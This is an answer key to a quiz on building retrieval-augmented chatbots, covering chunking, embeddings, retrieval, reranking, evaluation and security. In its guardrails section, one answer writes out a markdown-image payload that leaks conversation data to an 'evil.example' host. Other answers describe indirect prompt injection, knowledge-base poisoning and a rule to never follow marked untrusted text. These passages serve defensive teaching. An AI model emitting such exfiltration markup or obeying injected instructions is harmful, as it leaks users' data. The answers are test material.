# 19 — Mastery Quiz (Answer Key)

Try [`18-quiz-questions.md`](18-quiz-questions.md) first. Each answer points to the module that covers it.

---

## Module 00: Architecture
**A0.1** Offline: connect/ingest → parse/OCR → clean/dedupe → chunk → enrich → embed (dense, sparse, multi-vector) → index (with metadata, ACLs, versions). Online: auth → input guardrails → condense/understand/route → retrieve (hybrid, ACL-filtered) → fuse → rerank → assemble context → generate → output guardrails → respond with citations → log, feedback, evaluation.

**A0.2** Fine-tuning is poor at injecting *facts*. It doesn't cite them, they go stale, they're costly to refresh, and it can increase hallucination. It's good for *behavior*: tone, format, domain jargon, tool-use patterns, robustness to distractors (RAFT).

**A0.3** (1) The corpus is small (roughly < 100–200k tokens) and static. (2) QPS is low, or the same document is reused all session with prompt caching. (3) The task needs whole-document reasoning (summarize or compare an entire contract) where chunk selection would lose information. Also: no per-document ACLs.

**A0.4** Any five of: F1 missing content, F2 parse loss, F3 bad chunk boundaries, F4 context-less chunks, F5 missed top-K, F6 vocabulary mismatch, F7 cut by token budget, F12 stale/conflicting docs, F13 ACL leakage, F15 conversation drift (partly).

**A0.5** Open the trace. Check (1) whether the gold document exists in the corpus. (2) Whether it was in the first-stage top-100. (3) Whether it survived reranking into the top-k. (4) Whether it was in the final context. (5) Whether the answer used it correctly. The first "no" is the failing stage. That's the retrieval funnel (Module 12). Assign an F-code.

**A0.6** If the right evidence never reaches the context window, no LLM can save you. Corollary: if it does reach the window, modern LLMs usually use it, *provided the context is short, well ordered, and clean* (context rot, lost in the middle).

## Module 01: Ingestion & parsing
**A1.1** The text layer often follows drawing order, not reading order. Columns interleave, headers and footers mix into the body, tables flatten into number soup, and headings lose their hierarchy.

**A1.2** OCR and parsing errors cascade into *both* retrieval and generation quality. Downstream components can't fully recover from them.

**A1.3** Render the page → a layout detector labels boxes (title, header, text, list, table, figure, caption, formula, page header/footer) → text comes from the PDF text layer or OCR → a table-structure model (TableFormer) rebuilds rows, columns, and spans → formulas go to LaTeX, figures get crops or captions → a reading-order step → headers and footers are dropped → hierarchical JSON/Markdown output.

**A1.4** Markdown: compact and LLM-friendly, but loses merged cells. Use it for simple tables. HTML: keeps rowspan/colspan, costs ~2× tokens. Use it for complex tables. Row-wise linearization ("Plan: Pro; Monthly: $25"): each row is self-describing. Use it for embedding and for chunking big tables by row groups. Add a natural-language summary for retrieval.

**A1.5** Cell embeddings have no semantics or context, and they're stale copies. Route analytical questions to text-to-SQL or a dataframe tool over the live data. Embed only the schema, column descriptions, and maybe "row cards" for entity lookup.

**A1.6** The benchmark measures generic page fidelity. On your corpus the VLM may *hallucinate* plausible text or numbers, be non-deterministic across re-ingests, drop small print that matters, or be too costly to run on every page (so you sample). What matters is downstream: run the RAG golden set with parser A vs. parser B.

**A1.7** One substitution (i→l) over 15 characters → NED = 1/15 ≈ **0.067**.

**A1.8** Subscribe to SharePoint change notifications or a delta query. On a delete event, write a tombstone, then delete all chunks by `doc_id` (vector, BM25, question index, KG nodes) and invalidate caches. Also run an hourly reconciliation job that diffs source IDs against index IDs, to catch missed events. Track a freshness/deletion-lag SLO and alert on it.

## Module 02: Chunking
**A2.1** Small enough to be *specific*, large enough to be *self-contained*, and *aligned with meaning* (no broken sentences, tables, or code).

**A2.2** Try separators in priority order (paragraph → line → sentence → word → character). Split on the largest separator, recurse only into pieces still over the limit, then greedily merge adjacent pieces up to the size limit (with optional overlap).

**A2.3** A single vector is roughly an *average* of the chunk's content. 3,000 tokens covering many subtopics produce a diluted vector that's moderately similar to everything and strongly similar to nothing. Six focused chunks each have a sharp vector, and one of them matches the query strongly. Long chunks also risk truncation past the model's max length, and they waste context budget.

**A2.4** Embed sentences (or windows of them), compute the cosine distance between neighbors, and split where the distance exceeds a threshold (percentile, standard deviation, or gradient). Qu et al. 2024 found it did **not** consistently beat fixed-size or recursive chunking on realistic documents, despite costing more.

**A2.5** Index small child chunks for precise matching, but return the larger parent section to the LLM. This decouples retrieval precision from context sufficiency, fixing "matched the right sentence but missing the conditions and exceptions".

**A2.6** An LLM rewrites the text into atomic, decontextualized facts. It improves factoid retrieval. It hurts with explanation, reasoning, or narrative questions (cross-sentence logic is lost), it costs a lot, and it inflates the index 5–10×.

**A2.7** Embed the leaf chunks → cluster them (GMM over embeddings, with UMAP reduction) → an LLM summarizes each cluster → recurse on the summaries → index all levels. It helps thematic or global questions over long documents, while the leaves still serve detail questions.

**A2.8** Contextual retrieval adds real text, so it helps **BM25 and dense**. It **needs LLM calls**. Late chunking helps **dense only**, needs **token-level embeddings from a long-context model**, and needs no LLM, so it's **cheaper at 100M chunks**. Contextual retrieval often gives larger gains (Merola & Singh 2025).

**A2.9** Small chunks at a fixed K deliver fewer total tokens, so they look worse on recall simply because they deliver less text. Large chunks look good on recall but consume the budget. A fair comparison holds the *tokens delivered to the LLM* constant.

**A2.10** (a) −35%, (b) −49%, (c) −67% top-20 retrieval failure rate.

**A2.11** The distances above 0.5 are S3–S4 (0.62) and S5–S6 (0.55) → chunks **{S1,S2,S3}, {S4,S5}, {S6}**. {S6} is a singleton, so apply a min-size merge.

**A2.12** Recall = 72/80 = **0.90**. Precision = 72/600 = **0.12**. IoU = 72/(80 + 600 − 72) = 72/608 = **0.118**.

**A2.13** AST-aware with tree-sitter. One unit per function, class, or method, including signature, docstring, imports, and file path; split large classes by method. Splitting mid-block destroys syntax and meaning. Symbol identity enables call and import graph links.

**A2.14** Per-type chunkers. **Policies:** structure-aware on headings + recursive sub-split to ≤ 400–512 tokens, breadcrumbs, parent-child. **Slides:** one slide per chunk with speaker notes and the deck title, plus VLM captions for charts or ColPali. **Tickets:** clean quoted replies and signatures, extract problem→resolution, one chunk per ticket or per section (LinkedIn-style). **Code:** AST chunking. Add contextual retrieval to all of them and evaluate per type.

**A2.15** Any three: choosing size from blogs instead of evaluation; chunks beyond the embedder's max length (silent truncation); excessive overlap that duplicates results; splitting tables or code; losing offsets (no citations); re-chunking without re-embedding or versioning.

## Module 03: Enrichment
**A3.1** Prepend `Doc title > H1 > H2` to the chunk text. It costs no LLM calls (it comes from the parse), and it adds the subject and context the chunk itself lacks.

**A3.2** User queries look like questions, documents look like statements. Indexing LLM-generated questions makes the match question-to-question, which is symmetric and closer in distribution. It also injects user vocabulary (paraphrases, acronyms).

**A3.3** Each consumer needs different text. Dense benefits from context and breadcrumbs. BM25 benefits from keywords and synonyms. The LLM and the user should see the *original* text, so citations are faithful and enrichment can't inject invented facts into answers.

**A3.4** **Pre-filter.** Post-filtering takes the top-K first and then drops unauthorized results. That can leak data through intermediate steps (rerankers, logs, caches) and returns fewer than K results. ACLs must be part of the search query itself.

**A3.5** BM25 only: keywords, synonyms, acronym expansion (when added only to the sparse field). Dense only: late chunking. Both: breadcrumbs, contextual retrieval text, hypothetical questions (as a separate index for either), summaries, table descriptions.

**A3.6** 200,000 chunks. Without caching: 200k × 8k ≈ **1.6B** input tokens. With caching: ~80M written once (one per doc) + the remaining 1.52B read at 10% ≈ 152M → about **232M token-equivalents**, roughly 7× cheaper (plus ~16M output tokens for ~80-token contexts).

**A3.7** An LLM extracts structured metadata filters plus a residual semantic query from natural language. Validate field names against the schema, values against enums or known lists, and date parsing. Drop invalid filters (and log them) rather than failing or over-filtering.

## Module 04: Embeddings
**A4.1** A model that encodes the query and the document *independently* into vectors compared by cosine or dot product, so document vectors can be precomputed and searched with ANN.

**A4.2** CLS pooling (BGE, many BERT models); mean pooling (E5, sentence-transformers MiniLM, Nomic); last-token/EOS pooling (Qwen3-Embedding, E5-mistral, gte-Qwen); learned latent-attention pooling (NV-Embed).

**A4.3** With causal attention, each token sees only earlier tokens. Only the final token has attended to the whole input, so its hidden state is the natural summary.

**A4.4** `L = −log( e^{s⁺/τ} / (e^{s⁺/τ} + Σ_j e^{s⁻_j/τ}) )`. Temperature τ sharpens or softens the softmax: a small τ amplifies differences and focuses on hard negatives. In-batch negatives reuse every other example in the batch as a negative, so bigger batches give more negatives for free and a better model.

**A4.5** Case 1: e^16 = 8.886e6, e^12 = 1.628e5, e^10 = 2.203e4 → p ≈ 0.980 → **L ≈ 0.020**. Case 2: e^15.6 = 5.956e6 → p = 8.886e6/14.864e6 ≈ 0.598 → **L ≈ 0.51**. A hard negative produces about 25× the loss, and a correspondingly larger gradient.

**A4.6** Training sums the loss over several prefix lengths, so the first n dimensions form a valid embedding on their own. You can truncate for storage or speed. **Re-normalize to unit length after truncating.**

**A4.7** 10M × 1024 × 4 B = **~41 GB** float32; int8 = **~10 GB**; binary = 1024 bits = 128 B → **~1.3 GB**.

**A4.8** → **1 0 1 0** (sign bits). Retrieve candidates with Hamming distance (e.g. the top 200), then **rescore** them with int8/float vectors, often stored on disk. This recovers ~95%+ of the quality.

**A4.9** MTEB averages many tasks (not just retrieval), and many models train on the in-domain training sets (contamination/overfitting). The average hides domain and language weaknesses. RTEB uses private, held-out retrieval datasets to measure generalization more honestly. Either way, run your own bake-off.

**A4.10** E5: `query: ` / `passage: `. Nomic: `search_query: ` / `search_document: `. Qwen3-Embedding: `Instruct: {task}\nQuery: ` on the query side only. Forgetting them silently costs several nDCG points.

**A4.11** Mine candidates from the base retriever's top 10–100 for each query. Skip the very top ranks (often unlabeled true positives). Filter with a cross-encoder or LLM judge, discarding anything scored as relevant. Optionally use positive-aware thresholds (e.g. drop negatives scoring above 95% of the positive's score).

**A4.12** BGE-M3 (dense + sparse + multi-vector). Jina v4 (single + multi-vector, text + images). Cohere Embed v4 and Voyage multimodal (multimodal). ColPali/ColQwen (visual multi-vector).

**A4.13** Create a new versioned index → dual-write new documents to both → backfill-embed the corpus → shadow-evaluate (offline golden set + mirrored traffic) → switch the alias → keep the old index for rollback → delete it. Never mix models in one index, and budget the re-embedding cost and time.

**A4.14** Mean = [2, 1, 1]; norm = √6 ≈ 2.449 → **[0.816, 0.408, 0.408]**.

## Module 05: Indexing
**A5.1** `M`: graph degree (recall vs. memory). `ef_construction`: build-time beam width (graph quality vs. build time). `ef_search`: query-time beam width (recall vs. latency).

**A5.2** Start at the entry point on the top (sparsest) layer. Greedily move to the neighbor nearest the query until nothing improves, then descend a layer. Repeat. On layer 0, run a beam search keeping `ef_search` candidates, then return the top-k. This takes about O(log N) hops.

**A5.3** k-means clusters the vectors into `nlist` lists. A query scans only the `nprobe` nearest lists. Larger `nprobe` means higher recall and more latency. Vectors near cluster borders are the ones missed when `nprobe` is small.

**A5.4** 64 sub-vectors × 1 byte = **64 bytes** vs. 4,096 bytes → **64× compression**.

**A5.5** The greedy walk relies on graph connectivity. If 99.5% of nodes are filtered out, most neighbors are invalid, the walk gets stuck, and too few valid results come back. Mitigations: switch to brute force over the filtered subset below a selectivity threshold, filter-aware graph construction (e.g. ACORN, payload subgraphs), partitioning by tenant or filter value, or a larger `ef`.

**A5.6** When the vectors don't fit in RAM affordably (hundreds of millions to billions). DiskANN keeps compressed vectors in RAM and the graph plus full vectors on SSD, trading some latency for a much lower cost.

**A5.7** Compute exact top-k with a flat index for a held-out query set, then measure the overlap of the ANN top-k with it (recall@k). Do it with production filters, at production `ef`, after deletes and updates.

**A5.8** (a) **pgvector (+ pgvectorscale)**: data and ACLs (row-level security) already live there, and joins and transactions come free. (b) **Turbopuffer, Pinecone serverless, or Milvus/Zilliz**: object-storage economics and distributed scale for billions of vectors and many tenants. (c) **Vespa** (or Elastic/OpenSearch): first-class hybrid, ranking expressions, multi-vector, custom ranking profiles.

**A5.9** Per-tenant collections: strong isolation, easy deletion or export, per-tenant tuning; but many small indexes add overhead. Shared collection: efficient and simple to operate, but you depend on the filter for isolation, and noisy neighbors can affect you. Regulated customers usually get isolation.

## Module 06: Query understanding
**A6.1** Rewrite a follow-up plus the history into a standalone query. "And for the UK?" after a German parental-leave question → "Parental leave policy for employees in the United Kingdom".

**A6.2** An LLM writes a hypothetical answer; that answer is embedded and used to search (answer-to-answer similarity). It hurts with exact IDs and lookups, with domains the LLM doesn't know (it confidently invents wrong specifics), and when latency budgets are tight. Never show the hypothetical text to the user.

**A6.3** Generate N paraphrases, retrieve for each, and fuse with RRF. Benefit: robustness to wording, so higher recall. Cost: N× retrieval, an LLM call, and possible topic drift.

**A6.4** For multi-part, comparison, or multi-hop questions. "Compare the 2025 vs. 2026 international flight limits" → two sub-queries, retrieved in parallel, with the labeled evidence given to the generator.

**A6.5** Label a sample of traffic (or use a strong LLM as a periodic auditor) and compute the router's confusion matrix. Monitor proxy signals on the KB route: answers containing numbers or aggregations, abstentions, and thumbs-down on questions with words like "how many" or "trend". Alert on shifts in the route distribution, and keep a labeled routing set in CI.

**A6.6** First ask a more general, higher-level question (principles or background), retrieve for both questions, then answer the specific one with that broader context.

**A6.7** One small-model structured-output call returning `{intent, standalone_query, sub_queries[], filters{}, needs_retrieval, complexity, language, clarifying_question}`. Validate intents and filter values against enums, check date formats, cap the number of sub-queries, fall back to `kb_qa` with the raw query on parse errors, and log everything.

## Module 07: Retrieval
**A7.1** BM25 rewards exact rare tokens heavily through IDF. Dense models tokenize "E1043" into fragments and map it to a vague region of vector space, near other codes.

**A7.2** k1 controls term-frequency saturation (how fast extra occurrences stop adding score). b controls document-length normalization (0 = none, 1 = full).

**A7.3** IDF = ln((1000 − 2 + 0.5)/(2 + 0.5) + 1) = ln(399.4 + 1) = ln(400.4) ≈ **5.99**.

**A7.4** Denominator = 2 + 1.2·(1 − 0.75 + 0.75·120/200) = 2 + 1.2·0.70 = 2.84. Numerator = 2·2.2 = 4.4 → **1.549**.

**A7.5** BERT's masked-language-model head outputs logits over the vocabulary at each position. The weight for each term is log(1 + ReLU(logit)), max-pooled over positions, with a FLOPS regularizer keeping the vector sparse. Because the MLM head predicts *related* words, terms that aren't in the text (synonyms, related concepts) get weight. That's learned expansion.

**A7.6** They're on different, incomparable scales and distributions: BM25 is unbounded and query-dependent, while cosines sit in a narrow band. Adding them lets one retriever dominate arbitrarily.

**A7.7** RRF(d) = Σ_r 1/(k + rank_r(d)). k is a smoothing constant that dampens differences between the top ranks; it's usually **60**.

**A7.8** A = 1/61 + 1/62 = 0.03252; C = 1/63 + 1/61 = 0.03227; B = 1/62 + 1/64 = 0.03175; E = 1/63 = 0.01587; D = 1/64 = 0.01563 → **A > C > B > E > D**.

**A7.9** BM25 normalized: A 1.0, B 0.641, C 0.5, D 0. Dense normalized: C 1.0, A 0.857, E 0.619, B 0. Hybrid = 0.6·dense + 0.4·bm25: A 0.914, C 0.800, E 0.371, B 0.256, D 0 → **A > C > E > B > D**.

**A7.10** Pitfalls: B's real cosine of 0.61 became 0 just because it was the lowest in the list. Outliers squash the others. Single-result lists divide by zero. Scores depend on which documents happened to be retrieved. Alternatives: z-score normalization, DBSF (μ ± 3σ), theoretical bounds ((cos + 1)/2), or rank-based RRF.

**A7.11** RRF: the default, no tuning data needed, any number of lists. Convex combination: when you have a dev set and score magnitudes carry information. Learning-to-rank: when there are many features (BM25, dense, CE, recency, authority, clicks) and enough labels or clicks.

**A7.12** Y: 0.7·0.88 − 0.3·0.97 = 0.325. Z: 0.7·0.80 − 0.3·0.30 = 0.470 → **Z**. The near-duplicate Y is skipped.

**A7.13** Any four: missing query prefix; different analyzers or tokenizers at index vs. query time; ACL post-filtering; duplicate chunks filling the top-K; cosine metric on unnormalized vectors; query or chunk truncation past the max length.

**A7.14** Pick K by token budget, then apply a calibrated reranker-score threshold. Fit the threshold on the golden set (including unanswerable questions), for example to maximize F1 for answerable-vs-unanswerable, or to target a set precision. Keep the hits above the threshold. If none pass, abstain or ask a clarifying question. Also cut off at a sharp score drop.

## Module 08: Reranking
**A8.1** `[CLS]` is the first token; its final hidden state summarizes the whole pair and feeds the scoring head. `[SEP]` separates (and ends) the query and document segments. Segment (token-type) IDs mark query tokens as 0 and document tokens as 1. RoBERTa-style models use `<s>` and `</s>` instead.

**A8.2** Full cross-attention between every query token and every document token lets the model judge relevance in context (negation, conditions, synonyms in context). A bi-encoder compresses each text into a vector without knowing what it'll be compared to.

**A8.3** Nothing can be precomputed. Scoring the corpus would take N transformer passes per query (each O((|q| + |d|)²) attention). At 10M documents that's impossible within a latency budget. Bi-encoders take one query pass plus an ANN lookup.

**A8.4** σ(2.3) = 1/(1 + e^−2.3) ≈ **0.909**. σ(−1.1) ≈ **0.250**.

**A8.5** Start from a pretrained encoder or LLM. Data: queries with positives (MS MARCO, domain sets, synthetic) plus hard negatives mined from BM25 or dense retrieval. Losses: pointwise BCE (relevant = 1, irrelevant = 0) or localized contrastive/listwise softmax over 1 positive + n negatives. Optionally distill from a larger teacher (MarginMSE, LLM rankings). Evaluate with nDCG@10.

**A8.6** e^4 = 54.60, e^1 = 2.718, e^0.5 = 1.649, e^−1 = 0.368. Sum = 59.33 → p = 0.920 → **L ≈ 0.083**.

**A8.7** Input "Query: q Document: d Relevant:". Take the decoder's logits for the tokens "true" and "false" at the first output position, softmax over the two → P(true) is the score.

**A8.8** Format an instruction + query + document prompt ending with "Answer yes or no". Run a single forward pass and read the next-token logits for "yes" and "no" at the final position. The score is softmax([yes, no])[yes]. No generation loop is needed.

**A8.9** A sliding window: rank a window (e.g. 20 passages), slide it by a step (e.g. 10) from the bottom of the list to the top, so strong passages bubble up. Downsides: slow (generation), costly, position bias, parsing failures, and no calibrated scores (so no threshold-based abstention).

**A8.10** max(0.82, 0.31, 0.40) + max(0.35, 0.77, 0.20) = 0.82 + 0.77 = **1.59**.

**A8.11** bge-reranker-v2-m3: encoder cross-encoder (XLM-R), ~568M. MiniLM-L-6: encoder cross-encoder, ~22M. Qwen3-Reranker-4B: decoder-LLM pointwise (yes/no), 4B. RankZephyr: listwise LLM, 7B.

**A8.12** Hybrid top-150 → a cheap cross-encoder (e.g. bge-v2-m3) → top-20 → for queries the router flags as complex or reasoning-heavy, an LLM listwise or reasoning reranker → top 5–8. Apply business priors (recency, authority, `is_latest`) *after* semantic scoring: `final = ce + β·recency + γ·authority`, with β and γ tuned on the evaluation set.

**A8.13** Score the golden set, which includes answerable and unanswerable questions. Look at the distribution of max reranker scores for each group, and choose τ to hit the abstention precision/recall you want (or maximize F1). Re-calibrate whenever the reranker, chunking, or corpus changes. Optionally fit isotonic or Platt calibration.

**A8.14** BM25 matched the shared word "carry". The cross-encoder reads the whole passage and sees it's about luggage. This shows lexical matching produces false positives through polysemy, which is exactly what reranking fixes.

## Module 09: Advanced RAG
**A9.1** The model is trained to emit tokens deciding *Retrieve?* (whether to fetch), *IsRelevant* (whether a passage is relevant), *IsSupported* (whether the generation is supported), and *IsUseful* (overall utility). It uses them to retrieve adaptively and to critique or select its outputs.

**A9.2** An evaluator grades the retrieved documents. **Correct** → refine the documents (decompose them into strips and keep the relevant ones). **Incorrect** → rewrite the query and use web or broader search. **Ambiguous** → do both.

**A9.3** Chunk → LLM-extract entities and relationships → merge and summarize them → hierarchical Leiden communities → an LLM community report per community. Global search: every community report produces a partial answer with a helpfulness score (map); the best partial answers are combined into the final answer (reduce).

**A9.4** Agentic search substantially improves dense RAG and narrows the gap to GraphRAG (especially with RL-trained agents). GraphRAG keeps an advantage on complex multi-hop reasoning and shows more stable agentic behavior *when its offline indexing cost is amortized*.

**A9.5** Link the query's entities to KG nodes as seeds. Personalized PageRank spreads probability from the seeds along the graph's edges, so nodes connected to *several* seeds get high scores in a single step. Passages are scored by the PPR mass of their nodes. This gives multi-hop retrieval without iterative LLM calls.

**A9.6** A max-steps cap, a token/cost budget, timeouts, loop detection (repeated identical searches), per-user tool allow-lists with ACL-filtered tools, human confirmation for state-changing actions, and full logging of every tool call.

**A9.7** A VLM encodes each page image into ~1k patch embeddings (128-d). Query tokens are scored with MaxSim against the patches. Storage is ~264 KB per page in fp16, so 1M pages ≈ 264 GB. Mitigate with binarization, token pooling, or MUVERA.

**A9.8** Better: charts, infographics, slides, complex layouts, and scans where OCR loses information. Worse: exact text lookup (IDs, clauses), huge text-heavy corpora (storage cost), and cases where you need text spans for citations. Use it alongside a text index.

**A9.9** First confirm the failure type with the retrieval funnel. Add decomposition in query understanding plus an agentic route (plan → parallel sub-searches → sufficiency check → synthesis) for queries classified as `multi_hop` only, with step and cost caps. Evaluate on the multi-hop slice. If entity-relationship questions still fail on a stable corpus, run an experiment with HippoRAG 2 or LightRAG. Adopt only if the slice improves within the latency and cost budget.

**A9.10** Preload a small, static knowledge base into the model's context or KV cache (with prompt caching) and skip retrieval. It fits when the knowledge base is < ~100k tokens and changes rarely (FAQs, a product manual).

## Module 10: Generation & context engineering
**A10.1** LLM performance degrades as input length grows, even on simple tasks and well before the advertised window limit (Chroma 2025).

**A10.2** Models use information at the beginning and end of the context better than information in the middle (Liu et al. 2023).

**A10.3** Put stable content (system prompt, tool definitions, static instructions) first as a cacheable prefix, and put the variable parts (retrieved sources, history, question) after it. Avoid putting timestamps or user-specific details in the prefix.

**A10.4** Recency: the question sits right next to where generation starts. That counters dilution by long context and reminds the model what to answer.

**A10.5** Inline `[n]` markers (simple and universal, but can mis-cite). Native citations APIs (span-level and reliable, but vendor-specific). Quote-then-answer (very grounded and verifiable, but longer). Post-hoc attribution with NLI or a judge (works with any model, but an extra call).

**A10.6** Prefer the newest effective date or the most authoritative source, explicitly surface the conflict with both citations, and suggest verifying with the owner. Never silently merge contradictory claims.

**A10.7** 32,000 − (600 + 300 + 1,200 + 50 + 1,000) = **28,850** tokens → **19** parents of 1,500 tokens (28,500). In practice you might deliberately use less (e.g. 12k) because of context rot and cost.

**A10.8** Retrieval-Augmented Fine-Tuning: train with oracle and distractor documents and chain-of-thought answers that quote the oracle. This makes the model robust to irrelevant context. Consider it after retrieval and prompting have saturated, for a stable domain.

## Module 11: Conversation & memory
**A11.1** Working, short-term (session), long-term semantic, episodic, procedural.

**A11.2** Retrieval needs a self-contained query (pronouns resolved, entities explicit) to match documents. Generation needs the raw nuance of the conversation (tone, exact wording, constraints) to answer naturally and correctly.

**A11.3** Extract candidate facts after a session. For each, search the existing memories and let an LLM decide: ADD (new), UPDATE (refine an existing memory), DELETE (contradicted or obsolete), or NOOP (duplicate). This avoids unbounded, contradictory growth.

**A11.4** Write selectively (stable facts only), timestamp everything and track validity periods (temporal memory), apply UPDATE/DELETE on contradiction, apply TTL or decay, use retrieval thresholds, let users view, edit, and delete their memories, treat memory as lower authority than documents, and evaluate memory's effect on task success.

## Module 12: Evaluation
**A12.1** Later stages can only reorder or use what the first stage returns. If the gold chunk isn't among the candidates, no reranker or LLM can recover it.

**A12.2** Recall@3 = **0.5**; Recall@5 = **1.0**; P@5 = **0.4**; MRR = **0.5**; AP = (1/2 + 2/4)/2 = **0.5**; DCG = 1/log2(3) + 1/log2(5) = 1.062; IDCG = 1 + 0.631 = 1.631 → nDCG@5 = **0.651**.

**A12.3** DCG = 7/log2(3) + 1/log2(5) = 4.416 + 0.431 = 4.847. IDCG = 7/1 + 1/log2(3) = 7.631 → **0.635**.

**A12.4** Faithfulness = **0.75**. Citation precision = 3/3 = **1.0**. Citation recall = 3/4 = **0.75**. The 4th claim is an unsupported hallucination.

**A12.5** p_o = 0.85; p_e = 0.6·0.55 + 0.4·0.45 = 0.51 → κ = 0.34/0.49 ≈ **0.69**.

**A12.6** Position bias (randomize order, judge both orders). Verbosity bias (penalize length in the rubric, or normalize length). Self-preference (use a different model family). Leniency or scale drift (binary or pairwise judgments, anchored rubrics, examples). Unvalidated judge (calibrate against human labels with κ). Also: holistic scoring (use claim-level checks instead).

**A12.7** RAGAS uses prompted LLM metrics, off the shelf, plus synthetic test generation. ARES fine-tunes lightweight judge models on synthetic data for each metric, and uses prediction-powered inference with a small human-labeled set to produce confidence intervals. It adapts better to new domains and gives statistically grounded estimates.

**A12.8** Questions from real logs, SMEs, and filtered synthetic generation. Include unanswerable (~10–15%), multi-hop, comparison, time-sensitive, ambiguous, adversarial, multilingual, and typo cases. Labels: reference answer, gold doc/chunk IDs, intent, difficulty, must_cite, should_abstain. Size: 200–500 to start, growing to 1–3k. Version it, with frozen test and dev splits.

**A12.9** Compute per-question score differences (B − A) on the same questions. Resample the differences with replacement many times (e.g. 10k) and compute the mean each time. Take the 2.5th and 97.5th percentiles as a 95% CI. If the CI excludes 0, the difference is significant.

**A12.10** The largest controllable buckets are generation (30) and ranking (25), so prioritize prompt, context ordering, the generator model, and the reranker/candidate count. Next: retrieval coverage (18: parsing, chunking, hybrid search). Send content gaps (12) to content owners. Fix labels and the judge (15) so the measurement is trustworthy. Don't start with a new embedding model.

**A12.11** Any three: an immediate rephrase of the same question, an escalation to a human, session abandonment right after an answer, a lack of copy or click-through on citations, a repeated "that's wrong" or "no".

**A12.12** Gates on the frozen test set: answer correctness ≥ X (no slice regression > 3 points); faithfulness ≥ 0.95; citation precision ≥ 0.9; **abstention recall** on unanswerables ≥ 0.9 and **false-abstention rate** on answerables ≤ 5%; zero ACL leaks; red-team attack success below target; p95 latency and $/query within budget. Then a canary and an A/B test on business metrics.

## Module 13: Guardrails & security
**A13.1** Direct injection: the *user* types the malicious instructions. Indirect injection: the instructions arrive through *content* the system retrieves or reads (documents, web pages, emails), so the attacker never needs to talk to the bot.

**A13.2** If the UI renders `![x](https://evil.example/p?d=<data>)`, the browser fetches that URL, sending the embedded conversation data to the attacker's server. Defend by not rendering external images and by allow-listing URLs.

**A13.3** An attacker inserts a few passages crafted to be highly similar to target questions (so they get retrieved) and containing the attacker's desired answer. Defenses: write-access control and provenance, authority-weighted ranking, anomaly detection for new documents that dominate popular queries or look "question-shaped", cross-source consistency checks, and audit trails.

**A13.4** An automated ACL matrix test: synthetic users × documents with known permissions. For a battery of queries (including ones targeting restricted content), assert that the *retrieved candidate sets* at every stage (BM25, dense, question index, graph, cache) contain no unauthorized chunk. Run it in CI and after every ACL sync change. Also audit production logs: retrieved chunk ACLs ⊆ user groups.

**A13.5** Techniques that mark untrusted text so the model can tell it apart from instructions: delimiting, interleaving a special marker character between words (datamarking), or encoding the text (e.g. base64). Combined with an instruction to never follow marked content.

**A13.6** (1) Better retrieval. (2) Strict grounding instructions plus an abstention path. (3) Claim-level citations plus verification. (4) An output groundedness classifier. (5) Lower temperature or a more faithful model. (6) UX that shows sources.

**A13.7** Inversion attacks (e.g. Vec2Text) can reconstruct much of the original text from its embedding. So vectors carry the same sensitivity as the text: encrypt them, restrict access, and respect deletion.

**A13.8** BM25, dense, hypothetical-question index, summary/title index, graph and KG lookups, neighbor/parent expansion, agent tools, and semantic and response caches.

## Module 14: Production
**A14.1** Input guardrails ‖ condensing/routing; BM25 ‖ dense ‖ question-index retrieval; multi-query or sub-query retrievals; output guardrail checks streaming alongside generation; logging asynchronously.

**A14.2** No caching: 6,000 × 3/1M = $0.018 + 400 × 15/1M = $0.006 → **$0.024**. Cached: 1,500 × 0.3/1M = $0.00045 + 4,500 × 3/1M = $0.0135 + $0.006 → **≈ $0.020**.

**A14.3** Security: entries shared across permission scopes or tenants (a user gets an answer built from documents they can't access). Correctness: a too-low similarity threshold (password vs. PIN), stale entries after document updates (no `corpus_version` or doc-dependency invalidation), and ignoring language or user context.

**A14.4** Raw and condensed query, route, filters, retrieved IDs and scores per stage, reranked IDs, final context IDs, prompt and pipeline version, model, token counts, per-stage latency, answer, citations, guardrail verdicts, and user feedback. PII redacted.

**A14.5** Start retrieval with the raw query while condensing runs. If the condensed query is nearly identical to the raw one, reuse those results; otherwise retrieve again. This removes a serial LLM hop on most single-turn traffic.

**A14.6** Incremental ingestion with change detection, delete propagation, a freshness SLO, stale and duplicate content detection, coverage-gap analytics, blue/green re-embedding migrations, HNSW compaction, backups and snapshots.

## Module 15: Enterprise case studies
**A15.1** +77.6% MRR and −28.6% median per-issue resolution time. The key idea: model tickets as structured trees linked into a knowledge graph, instead of flat text chunks.

**A15.2** RAG over KB articles and resolved cases, plus a two-tier LLM guardrail (a cheap check, then an LLM check for groundedness, coherence, and compliance) before responses ship, plus an LLM judge scoring five quality dimensions, plus human transcript review to calibrate. Reported: ~90% fewer hallucinations and ~99% fewer severe compliance issues.

**A15.3** Freshness, Architecture, Cost, Testing, Security: the dimensions for building enterprise RAG chatbots, drawn from NVIDIA's internal bots, with 15 control points across the pipeline.

**A15.4** A company can be held liable for what its chatbot tells customers. Grounding in authoritative, current policy, plus citations and abstention, is a legal requirement, not polish.

**A15.5** (1) Evaluation with domain experts and continuous judging is what earns trust and drives improvement. (2) Retrieval and data quality, including exploiting the native structure of documents, beat model size. (3) Guardrails, ACLs, and lifecycle operations (freshness, feedback loops, humans in the loop) are core product features.

## Module 16: Build plan
**A16.1** Without a baseline and a metric, you can't tell whether any change helps, and you risk overfitting to anecdotes. Evaluation determines every later decision and gate.

**A16.2** The chosen configuration must beat baseline Recall@10 by ≥ 10% relative with no slice regression, compared at equal context tokens, and the results must be documented in a report.

**A16.3** Every chunker, embedder, retriever, fuser, reranker, and generator can be swapped without code changes. Experiments become declarative config diffs that are reproducible and comparable, and ablations or A/B tests are cheap to run.

## Capstone scenarios (outline answers; strong answers justify each choice with evaluations)
**AC.1** Connectors with ACL sync (incremental + reconciliation). Docling with a VLM fallback for low-quality pages. Structure-aware 400-token chunks + breadcrumbs + contextual retrieval (batched and cached) or late chunking for cost. A multilingual embedder (Qwen3-Embedding-0.6B/4B or BGE-M3) at int8 with MRL 512–1024 dims. A language-aware BM25 (Japanese needs a morphological analyzer such as Kuromoji or Sudachi) or BGE-M3 sparse. Qdrant, Vespa, or OpenSearch with filtered HNSW and ACL pre-filters. RRF fusion. bge-reranker-v2-m3 on 100 candidates. A small router/condense model (cross-lingual queries allowed). A mid-tier generator with a cached prefix and an 8k-token source budget. Output grounding checks. Semantic cache by permission scope. Tracing. Golden sets per language. Cost check: about 5k input + 400 output tokens on a small or mid model, with caching and routing, fits $0.01. Latency: parallel legs, roughly a 2–3 s p95.

